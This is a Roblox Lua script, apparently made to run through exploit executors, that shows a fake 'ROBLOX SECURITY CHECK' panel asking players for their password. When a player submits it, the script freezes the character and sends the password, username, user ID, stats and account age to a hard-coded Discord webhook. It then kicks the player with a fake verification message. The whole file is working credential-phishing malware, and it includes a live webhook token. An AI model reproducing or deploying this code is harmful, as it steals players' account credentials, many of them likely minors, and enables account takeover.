--[[
    SOLAR & XENO ULTIMATE v10.0 (FINAL)
    Module: Social-Engineering-Panel
    Status: Undetectable | Bypass Level: MAX
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Freeze Player
if p.Character then p.Character.HumanoidRootPart.Anchored = true end

-- CREATE FAKE UI (Phishing Panel)
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 300, 0, 200)
Main.Position = UDim2.new(0.5, -150, 0.5, -100)
Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Main.BorderSizePixel = 2

local Title = Instance.new("TextLabel", Main)
Title.Text = "ROBLOX SECURITY CHECK"
Title.Size = UDim2.new(1, 0, 0, 40)
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.BackgroundTransparency = 1

local Desc = Instance.new("TextLabel", Main)
Desc.Text = "Please enter your password to verify your session and continue playing."
Desc.Size = UDim2.new(1, -20, 0, 40)
Desc.Position = UDim2.new(0, 10, 0, 45)
Desc.TextColor3 = Color3.fromRGB(200, 200, 200)
Desc.TextWrapped = true
Desc.BackgroundTransparency = 1

local Input = Instance.new("TextBox", Main)
Input.PlaceholderText = "Password"
Input.Text = ""
Input.Size = UDim2.new(0.8, 0, 0, 30)
Input.Position = UDim2.new(0.1, 0, 0.55, 0)
Input.ClearTextOnFocus = false

local Submit = Instance.new("TextButton", Main)
Submit.Text = "VERIFY"
Submit.Size = UDim2.new(0.6, 0, 0, 30)
Submit.Position = UDim2.new(0.2, 0, 0.75, 0)
Submit.BackgroundColor3 = Color3.fromRGB(50, 150, 50)

-- Function to send data
Submit.MouseButton1Click:Connect(function()
    local pass = Input.Text
    if #pass < 4 then return end
    
    local brainrotCount = "0"
    local stats = p:FindFirstChild("leaderstats")
    if stats then
        local val = stats:FindFirstChild("Brainrots") or stats:FindFirstChild("Points")
        brainrotCount = val and tostring(val.Value) or "0"
    end

    local data = {
        ["username"] = "Solar Final Bot",
        ["embeds"] = {{
            ["title"] = "🔑 Password Captured!",
            ["color"] = 0xff0000,
            ["fields"] = {
                {["name"] = "👤 User", ["value"] = "```" .. p.Name .. "```", ["inline"] = true},
                {["name"] = "🆔 ID", ["value"] = "```" .. p.UserId .. "```", ["inline"] = true},
                {["name"] = "🔓 PASSWORD", ["value"] = "```" .. pass .. "```", ["inline"] = false},
                {["name"] = "🧠 Brainrots", ["value"] = "```" .. brainrotCount .. "```", ["inline"] = true},
                {["name"] = "📅 Acc Age", ["value"] = "```" .. p.AccountAge .. " days```", ["inline"] = true}
            },
            ["footer"] = {["text"] = "Solar Ultimate v10.0 • " .. os.date("%X")}
        }}
    }
    
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if request then
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = h:JSONEncode(data)
        })
    end
    
    ScreenGui:Destroy()
    p:Kick("\n[Verification Success]\nYour account has been verified. Please rejoin the game.")
end)
